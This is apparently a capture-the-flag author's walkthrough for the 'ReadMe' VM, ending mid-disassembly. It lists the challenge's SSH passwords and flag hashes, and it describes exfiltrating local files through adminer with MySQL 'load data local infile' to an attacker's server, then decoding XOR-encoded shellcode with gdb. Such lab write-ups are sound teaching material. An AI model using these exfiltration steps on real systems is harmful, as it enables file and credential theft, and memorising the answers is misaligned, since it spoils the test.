full_description = '''ReadMe Walkthrough August 18, 2019 Overview ReadMe is aiming to teach users about two things. One, a feature of MySQL that I have found to not be widely known about - which is that the client can be forced to send local files to the server. Two, some basic x86 assembly and analysis with gdb. Network Configuration ReadMe is currently using DHCP on the ens33 interface. This can be configured using netplan. The open ports are 22 (SSH), 3360 (a fake MySQL server), and 80 (Apache). User Credentials tatham:So...YouFiguredOutHowToRecoverThisHuh?GGWPnoRE julian:I_mean...WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh Both these users can login via SSH (required as part of the challenge). Julian is not part of the sudo group but tatham is. Flags User: 2e640cbe2ea53070a0dbd3e5104e7c98 Root: 52eeb6cfa53008c6b87a6c79f4347275 Path To User Flag Initially, the user will be able to see three open ports: 22 80 3306 The service listening on port 3306 is a Python script that accepts connections and mimics a MySQL server with remote authentication disabled. This is part rabbit-hole and part resource saver, given there is no need to have MySQL running. On port 80, a web server can be found which needs to be brute forced to find some key files: /info.php: shows phpinfo() output, which will show that the mysqli.allow_local_infile setting is enabled /reminder.php: contains an important hint for the root flag (that the code in tatham’s directory is using an encoder) and will also reveal the path of a directory containing an important file /adminer.php: a copy of adminer 4.4 Upon visiting reminder.php, the user will see a message directed towards julian followed by an image which is being served from a directory with no index that also contains a file named creds.txt. This file will reveal the path to where julian’s login credentials can be found on the local file system (/etc/julian.txt). With this information, the user can point adminer towards their own MySQL server in order to exfiltrate the contents of /etc/julian.txt. To do this, a MySQL server must be installed (apt install mysql-server) and a user created that has all privileges on a database (this can be any database, for example’s sake, I’ll be using the mysql database). When creating the user, the authentication type must be set to mysql_native_password due to the mysqli driver not supporting the latest default authentication method. If it is not, adminer will indicate to the user that it cannot authenticate and output a MySQL error. To setup a user this way, the following command should be executed in the MySQL CLI: CREATE USER 'jeff'@'%' IDENTIFIED WITH mysql_native_password BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'jeff'@'%'; Now that a new user is setup (in this case, jeff), the local_infile variable on the user’s MySQL server needs to be enabled. To do this, execute: SET GLOBAL local_infile = true; The setting can then be confirmed by running: SHOW GLOBAL VARIABLES LIKE 'local_infile'; If the setting was successfully enabled, the following output will be displayed: +---------------+-------+ | Variable_name | Value | +---------------+-------+ | local_infile | ON | +---------------+-------+ Now that the attacker’s MySQL server is setup, navigating to /adminer.php and filling in the connection details will force adminer to connect back to the attacker, where they will then be viewing their own database server in the web app. From here, files local to ReadMe can be exfiltrated to the attacker using the local infile syntax. First, the user must create a new table to save the data into. For this example, I have created a table named exploit with a single text column. After creating the table, going to the SQL command page and executing the following query will populate the exploit table with the contents of /etc/julian.txt: load data local infile '/etc/julian.txt' into table mysql.exploit fields terminated by "\n" After executing this query, clicking “select” to the left of the exploit table will reveal a row for each line in the file, which reveals the password for the julian account: With the password recovered, the user can then login via SSH as julian using the password and get the user flag from /home/julian/user.txt Path to Root Flag After authenticating as julian, the user will be able to see the contents of tatham’s home directory. Within this directory are two files: payload.bin: a file containing shellcode, which contains tatham’s password poc.c: a file that the shellcode can be placed in to run it There are two methods that can be used to decode the payload and recover the password. Method 1: Debugging First, place the contents of payload.bin into the placeholder of poc.c and compile with protections disabled: gcc -m32 -fno-stack-protector -z execstack poc.c -o poc Next, load poc into gdb (gdb ./poc) and disassemble the main function to find the point which the shellcode is called by running disas main: After confirming the offset, place a breakpoint (b *main+164) and then run the executable. Once the breakpoint is hit, stepping into the call eax instruction will then leave the user at the point of the xorfuscator decoder stub being executed: Once here, viewing the next 15 instructions that are to be executed (x/15i $pc) will reveal the address that the decoded payload can be found at after the stub has finished (in this case, 0xffffc595, this value will change every time due to ASLR): A breakpoint should be placed here (b *0xffffc595) and once it is hit, after continuing execution, should be stepped into. Now EIP will be pointing at the original shellcode that has been decoded in place. By viewing the next 70 instructions (x/70i $pc), the user will be able to dump out the original un-encoded instructions (the screenshot below was taken after stepping one instruction further in, in the original shellcode, there is a mov ebp, esp instruction before the first xor): Continuing to execute from this point will result in the password not being revealed, as the original payload contains two key mistakes that need to be fixed if the user wishes to reveal it via execution. Examining the recovered code will show 64 bytes being repeatedly loaded into the eax register, even though the rest of the code is trying to work with a value on the stack. This should make it clear that the lea eax instructions should actually be push instructions. In addition to this, the decoder loop is exiting after the first iteration as a jz instruction is being used as opposed to a jnz. A copy of the working and broken payloads can be found at the end of this post. After reconstructing the NASM file to represent something functionally equivalent to the original code (see sample at end of this post), it can be compiled by running (assuming the code is in a file named fixed.nasm): nasm -f elf32 fixed.nasm && ld -m elf_i386 fixed.o The previous command will now have built a file named a.out which is the fixed executable, running this in gdb will make execution pause when it reaches the interrupts at the end of the file, and the base64 encoded password will be visible on the stack: Decoding this value will reveal the password for the tatham account, which if the user logs into will be able to run any command as root using sudo, and will be able to then obtain the root flag. Method 2: Manually Decoding The alternative to recovering the decoded payload using gdb is to do it manually. Due to the relatively small size of the payload, this is doable and may make the process slightly easier if the encoding method can be identified. The encoder used as well as a script that contains the decoder stub is publicly documented here: https://rastating.github.io/creating-a-custom-shellcode-encoder/ By first removing the decoder stub from the contents of payload.bin, the user will be left with only the encoded payload. The user can then work through the remaining values and XOR each pair with the byte that precedes it as per the illustration on the aforementioned page: After recovering the original hexadecimal bytes, the ASM code can be recovered using ndisasm, as per below: $ echo -ne "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8d\x05\x12\x13\x7f\x7f\x8d\x05\x22\x2f\x7b\x15\x8d\x05\x12\x73\x24\x13\x8d\x05\x23\x04\x7b\x08\x8d\x05\x22\x70\x28\x73\x8d\x05\x12\x09\x28\x30\x8d\x05\x20\x2f\x16\x3b\x8d\x05\x19\x19\x0e\x36\x8d\x05\x13\x09\x7b\x15\x8d\x05\x60\x09\x7b\x75\x8d\x05\x10\x75\x16\x70\x8d\x05\x25\x2f\x16\x2d\x8d\x05\x23\x19\x24\x73\x8d\x05\x27\x75\x16\x09\x8d\x05\x0c\x2b\x77\x1a\x8d\x05\x17\x72\x78\x37\x8d\x4d\x00\x29\xe1\x8d\x15\x14\x00\x00\x00\x39\xd1\x74\x4a\x8d\x15\x18\x00\x00\x00\x39\xd1\x74\x48\x8d\x15\x1c\x00\x00\x00\x39\xd1\x74\x3e\x8d\x15\x20\x00\x00\x00\x39\xd1\x74\x3c\x8d\x15\x24\x00\x00\x00\x39\xd1\x74\x3a\x8d\x15\x28\x00\x00\x00\x39\xd1\x74\x38\x8d\x15\x2c\x00\x00\x00\x39\xd1\x74\x16\x8d\x15\x38\x00\x00\x00\x39\xd1\x74\x1c\xeb\x2a\xeb\xac\x8d\x1d\x46\x41\x41\x41\xeb\x28\x8d\x1d\x45\x41\x41\x41\xeb\x20\x8d\x1d\x42\x41\x41\x41\xeb\x18\x8d\x1d\x44\x41\x41\x41\xeb\x10\x8d\x1d\x34\x41\x41\x41\xeb\x08\x8d\x1d\x41\x41\x41\x41\xeb\x00\x8d\x45\x00\x29\xc8\x31\x18\x81\x28\x01\x01\x01\x01\x83\xe9\x04\x31\xc0\x39\xc1\x74\xb8\xcc\xcc\xcc\xcc" | ndisasm -b 32 -p intel - 00000000 89E5 mov ebp,esp 00000002 31C0 xor eax,eax 00000004 31DB xor ebx,ebx 00000006 31C9 xor ecx,ecx 00000008 31D2 xor edx,edx 0000000A 8D0512137F7F lea eax,[dword 0x7f7f1312] 00000010 8D05222F7B15 lea eax,[dword 0x157b2f22] 00000016 8D0512732413 lea eax,[dword 0x13247312] 0000001C 8D0523047B08 lea eax,[dword 0x87b0423] 00000022 8D0522702873 lea eax,[dword 0x73287022] 00000028 8D0512092830 lea eax,[dword 0x30280912] 0000002E 8D05202F163B lea eax,[dword 0x3b162f20] 00000034 8D0519190E36 lea eax,[dword 0x360e1919] 0000003A 8D0513097B15 lea eax,[dword 0x157b0913] 00000040 8D0560097B75 lea eax,[dword 0x757b0960] 00000046 8D0510751670 lea eax,[dword 0x70167510] 0000004C 8D05252F162D lea eax,[dword 0x2d162f25] 